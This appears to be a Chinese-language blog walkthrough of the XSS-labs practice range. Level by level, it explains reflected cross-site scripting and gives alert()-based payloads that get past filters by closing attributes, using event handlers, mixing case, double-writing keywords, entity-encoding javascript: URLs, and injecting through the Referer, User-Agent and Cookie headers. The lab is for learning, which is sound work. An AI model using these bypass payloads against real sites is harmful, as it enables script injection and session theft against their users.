# XSS-labs

[XSS常见的触发标签_xss标签_H3rmesk1t的博客-CSDN博客](https://blog.csdn.net/LYJ20010728/article/details/116462782) 

该补习补习xss漏洞了

## 漏洞原理

网站存在 静态 和 动态 网站

xss 针对的网站 就是 动态网站

```undefined
动态网站
 
会根据 用户的环境  与 需求 反馈出 不同的响应
 
 
静态页面 
 
代码写死了  只会存在代码中有的内容
```

通过动态网站 用户体验会大大加深 但是会存在漏洞 xss

```undefined
XSS 是一种注入漏洞
 
通过用户输入 在代码页中插入 恶意语句 从而实现注入
 
攻击成功 可以获取但不止 COOKIE 会话 和 隐私页面
```

首先我们来看看最简单

```php
<?php
 
$xss = $_GET['name'];
echo $xss;
 
?>
```

然后我们通过get传递漏洞

```cobol
<script>alert(1)</script>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/61b58a64e19f07b2d5ab932d6a4400de.png" alt="" style="max-height:678px; box-sizing:content-box;" />


xss需要通过php的输出指令来输出

我们通过做题目来继续了解吧

打开靶场

## Level1   【无过滤】



<img src="https://i-blog.csdnimg.cn/blog_migrate/860004e08978c13f0be8e9b0ae43c021.png" alt="" style="max-height:915px; box-sizing:content-box;" />


我们能发现 这三个地方

然后我们回去看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/f39acea4c94c4ea6e9b8630c1159812c.png" alt="" style="max-height:507px; box-sizing:content-box;" />


能发现 我们输入什么 他就存储在源代码什么

这里就是动态的

如果和sql注入一样 我们插入恶意代码呢

```cobol
<script>alert(1)</script>
 
这里通过 alert 来弹窗
 
这里 script 表示 JavaScript代码 / 表示结束了
 
 
 
那么这里插入后
 
<h2 align=center>欢迎用户test1</h2><center><img src=level1.png></center>
 
就变为了
 
 
<h2 align=center>欢迎用户test1<script>alert(1)</script></h2><center><img src=level1.png></center>
 
 
实现了 alert 弹窗
```

我们就实现了 第一题

## Level2   【参数】

我们依然看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/ebf354f09596681af87d5f9c3837f9d2.png" alt="" style="max-height:667px; box-sizing:content-box;" />


这里我们发现了 我们输入的值 被当做参数了

value="1">

这里我们就想到了 sql注入的闭合了

### <script>标签

```cobol
value="1">
 
如果我们自己将其闭合呢
 
我们输入 ">

就会变为

value="">">
 
这里 其实就是
 
value="">
">

然后我们构造恶意代码

value=""><script>alert(1)</script>
">
 
就会实现xss注入
```

所以payload就是

```xml
"><script>alert(1)</script>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8d92917fe568901551abf35b3c1ab6b0.png" alt="" style="max-height:179px; box-sizing:content-box;" />


### <img>标签

#### src

是资源的标签

一般

```
<img src="/i/eg_tulip.jpg" />
```

这样使用

如果读取不到 我们可以设置 onerror属性 来输出内容 这里就存在 xss

```xml
"> <img src="666" onerror=alert()> <"
```

#### 

#### 

#### onmouseout   鼠标移出图片

附属于 img 下的属性

payload为

```xml
"> <img src=666 onmouseout="alert()"> <"
```

#### onmouseover  鼠标移动到图片

```xml
"> <img src=666 onmouseover="alert()"> <"
```

#### data 伪协议

这里是利用 iframe标签

```cobol
"> <iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+> <"
 
PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+ 为 <sricpt>alert()</sricpt>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/dd2e4404cafed38f3a99ae90a2524ffb.png" alt="" style="max-height:389px; box-sizing:content-box;" />




## Level3   【htmlspecialchars】

我们查看代码 没有发现和上一题有什么不一样的

所以我们去继续使用上题的payload

```xml
"><script>alert(1)</script>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fee83cc49fe91ecb78c891fcbca63b00.png" alt="" style="max-height:239px; box-sizing:content-box;" />


发现被实体化了

并且只过滤了  <>

这里我们就需要想到是htmlspecialchars

我们去看xsslab源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/ab707267c8d994f5d92d8706cd1839a3.png" alt="" style="max-height:163px; box-sizing:content-box;" />


确实是这样



<img src="https://i-blog.csdnimg.cn/blog_migrate/d8ae4e1346e7079b7995c09f8eb29a0e.png" alt="" style="max-height:507px; box-sizing:content-box;" />


这里其实预定义了转义的内容  因为单引号没有被转义 但是其实可以实现的

```xml
&：转换为&amp;
"：转换为&quot;
'：转换为成为 '
<：转换为&lt;
>：转换为&gt;
```

发现就是为了让 <>里面的转变为字符串 失去闭合作用

### 单引号绕过

这里我们需要通过 ' 绕过

```xml
因为我们的<> 会被实体化
 
所以我们需要运用不需要<>的payload
 
我们可以利用 onfocus 事件
```

### onfocus事件

```undefined
当 页面中存在 输入框等 需要存在点击的界面时
 
onfocus 就可以被触发
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e71d07e1d4f738984a09daf660d93907.png" alt="" style="max-height:427px; box-sizing:content-box;" />


这里就存在一个很明显的例子

既然 onfocus可以出发函数那么我们就可以通过执行

这里就可以写入payload

```cobol
onfocus=javascript:alert()
```

这样就可以绕过 过滤 <>

那我们如何执行呢

```cobol
我们输入一个 ' 时

变成了下面这个
value="" '="">
 
 
 
我们输入 'abcd'
 
变为了
 
value="" abcd''="">
 
 
我们输入 payload
 
' onfocus=javascript:alert(1) ' 
 
就会变为
 
value=""  onfocus=javascript:alert(1) '' ="">
 
从而实现了闭合
```

所以最终payload

```csharp
' onfocus=javascript:alert(1) '
```

## Level4   【过滤><】

我们首先可以判断是否存在过滤

```xml
'"&<>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/810affe6ab0f7f4359dfca319909fb82.png" alt="" style="max-height:293px; box-sizing:content-box;" />


发现只有3个了 过滤了 <>

用上题目的payload

```csharp
' onfocus=javascript:alert(1) '
```

失效了

我们看看代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/9efae0b3d6c3e6d96a3061f463e5cce4.png" alt="" style="max-height:83px; box-sizing:content-box;" />


进行修改payload

```undefined
" onfocus=javascript:alert(1) '
```

## Level5   【过滤script】

我们使用第一题的payload直接上去



<img src="https://i-blog.csdnimg.cn/blog_migrate/61ace6ae3ab873c67d8fff3250d00ace.png" alt="" style="max-height:65px; box-sizing:content-box;" />


发现 script 变为了 scr_ipt

我们去看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/db67ec2cc3132d743a4f9480f1392034.png" alt="" style="max-height:167px; box-sizing:content-box;" />


发现过滤了 on 和 script

所以我们使用其他方式

### a herf

```cobol
<html
<p>123</p>
<a href=javascript:alert("yes")>xxxxxx</a>
</html>
```

我们先给出payload

然后我们解释一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/cc528e34fe03f755daea0bf47bd2acb2.png" alt="" style="max-height:262px; box-sizing:content-box;" />


通过 a标签 然后点击 我们可以实现跳转等操作

既然可以实现跳转 那我们也可以实现 执行JavaScript命令

我们开始做题

我们先传入内容

```cobol
<a href=javascript:alert()>xxxxxx</a>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8ac459ace3884d9a40ef67ab01434bd4.png" alt="" style="max-height:69px; box-sizing:content-box;" />


我们需要闭合 所以修改paylaod

```xml
"> <a href=javascript:alert()>xxxxx</a>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9d07de2b2137174f1e8e7a95ae884b17.png" alt="" style="max-height:103px; box-sizing:content-box;" />


还需要将后面的 "> 闭合

所以最后的payload为

```xml
"> <a href=javascript:alert()>xxxxx</a> <"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4a43f791ecfd91387735a29680e3f2b3.png" alt="" style="max-height:218px; box-sizing:content-box;" />


点击即可实现

## Level6   【过滤 a href】

我们把上面的 payload 丢进去看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/80e61ed0c1d7a98f6b08d68b0b16f7a7.png" alt="" style="max-height:77px; box-sizing:content-box;" />


发现 过滤 了 a href



<img src="https://i-blog.csdnimg.cn/blog_migrate/aa3728f5e05cdcfde097a2af7875cbcb.png" alt="" style="max-height:200px; box-sizing:content-box;" />


但是放出来了 大小写 所以我们可以

### 大小写绕过

"> <ScRipt>alert()</ScRipt> <"

或者

"> <a HrEf=javascript:alert()>xxxx</a> <"

又或者

" Onfocus=javascript:alert() "

## Level7  【替换为空】

我们先上关键词看看

```xml
" Onfocus <ScRipt> <a Href=javascript:alert()>
```

能发现返回值是



<img src="https://i-blog.csdnimg.cn/blog_migrate/c21015f513788f1979c9776987a8a0c1.png" alt="" style="max-height:66px; box-sizing:content-box;" />


```xml
" focus <> <a =java:alert()>
```

全部替换为空了

这里我们使用

### 双写绕过

开始构造

```xml
" OOnnfocus=javascscriptript:alert() "
 
"> <a hrhrefef=javascscriptript:alert()>xx</a> <"
```

## Level8   【a href标签自动url解码】

更新一下 关键词

```xml
" sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()>
```

看看过滤了啥



<img src="https://i-blog.csdnimg.cn/blog_migrate/2b81f27e3b8ce271d9a853d31d99edab.png" alt="" style="max-height:197px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/b211f0e268f35711903edf19038ceaed.png" alt="" style="max-height:225px; box-sizing:content-box;" />


这里为什么我们无法直接通过input来xss 因为存在 htmlspecialchars函数 会吧我们输入的内容

直接作为字符串输出



<img src="https://i-blog.csdnimg.cn/blog_migrate/7435e3a6cffbaba3f341a9e2cfb8d35d.png" alt="" style="max-height:109px; box-sizing:content-box;" />


引号被过滤了 无法实现闭合



所以没有用了

我们需要通过下面的 a href标签输出了

但是下面又存在过滤

我们如何实现呢

其实

#### a href 存在自动解密 url的功能

所以我们只需要通过编码绕过 过滤 如何通过 a href 编码执行即可

```cobol
javascript:alert()
 
 
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
 
 
unicode编码
```

直接输入即可

然后点击 友情链接即可

## Level9   【判断http在不在标签内】

我们看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/74560f9639c38c21d10d653bc24582b1.png" alt="" style="max-height:180px; box-sizing:content-box;" />


strpos 查看 http://是否在 输入里面 如果不在 输出不合法

这里就好办了

我们通过注释输入http://即可

运用上一道题目的payload

```cobol
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41; /* http:// */
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/dd41482d5919178bde9fe80f3f3018d1.png" alt="" style="max-height:136px; box-sizing:content-box;" />


这里就看到 http:// 是被注释掉了

## Level10 【闭合 fake hidden】

看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/086d763d43e9ff3e6b82cbbd179f73fc.png" alt="" style="max-height:265px; box-sizing:content-box;" />


发现需要另一个来传递

我们这里并且过滤了 <>

但是其实还是很简单的

```haskell
" onfocus=javascript:alert() " type=text
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e832a127d3d08b44ee456856d2f5d4a2.png" alt="" style="max-height:612px; box-sizing:content-box;" />


## Level11  【Referer注入】

我们再来看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/68ccc7ee9bab3706f159577faf46873b.png" alt="" style="max-height:350px; box-sizing:content-box;" />


通过referer

为什么无法通过 t_sort

因为 htmlspecialchars 无法闭合 " 会被实体化

所以我们通过 referer来进行 xss

referer 的内容 就和 上面一样

```haskell
" onfocus=javascript:alert() " type=text
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/6b8cdeea1b30b387e7c44a7a9927ca6a.png" alt="" style="max-height:274px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/0f91ffcf6aa08373e2a81e56916ba3c8.png" alt="" style="max-height:601px; box-sizing:content-box;" />


## Level12 【UA注入】

```haskell
" onfocus=javascript:alert() " type=text
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3feee2c6fe9904e5eeb1af684756fc26.png" alt="" style="max-height:320px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/424231fc458dc4d013ef8db313000cd0.png" alt="" style="max-height:874px; box-sizing:content-box;" />


## Level13 【cookie注入】

```haskell
" onfocus=javascript:alert() " type=text
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0799dc0ee340a33a9aea0ec872b80137.png" alt="" style="max-height:765px; box-sizing:content-box;" />


## Level14  【通过图片属性实现xss】

这里我的小皮环境有问题 无法实现文件上传

这里 主要就是通过 图片的属性解析 然后我们写入 xss语句

这样就会报错

 [[靶场] XSS-Labs 14-20_3hex的博客-CSDN博客](https://blog.csdn.net/qq_40929683/article/details/120422266) 

## Level15   【通过src访问文件执行】

这里的意思就是src是访问了 一个图片

那我们可以通过这个src访问第一题的php 然后通过 第一题的php来执行

但是我还是无法实现 可能我php没开启属性

 [xss-labs靶场实战全通关详细过程（xss靶场详解）-CSDN博客](https://blog.csdn.net/l2872253606/article/details/125638898) 

## Level16   【绕过空格】

 [XSS常见的触发标签_xss标签_H3rmesk1t的博客-CSDN博客](https://blog.csdn.net/LYJ20010728/article/details/116462782) 



<img src="https://i-blog.csdnimg.cn/blog_migrate/9b2bbf372d27bd3d10209e75bd9a2d4c.png" alt="" style="max-height:189px; box-sizing:content-box;" />


查看代码

发现过滤了 空格 和 /

首先就是查找一个不需要/的触发标签

这里我选择

```cobol
<video><source onerror="alert(1)">
```

其次需要绕过空格

我们可以首先看看 这两个空格是什么编码



<img src="https://i-blog.csdnimg.cn/blog_migrate/370a5cb56b63f4c4d2d39c333b32d706.png" alt="" style="max-height:630px; box-sizing:content-box;" />


那么这里面我们可以使用 %0a绕过

所以payload就是

```cobol
<video><source%0Aonerror="alert(1)">
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/75501b32e5953c3b5c2c12865acc468c.png" alt="" style="max-height:736px; box-sizing:content-box;" />


## Level17

后面是 flash的插件了

我觉得没有必要做了 因为现在 flash已经被大多数浏览器抛弃了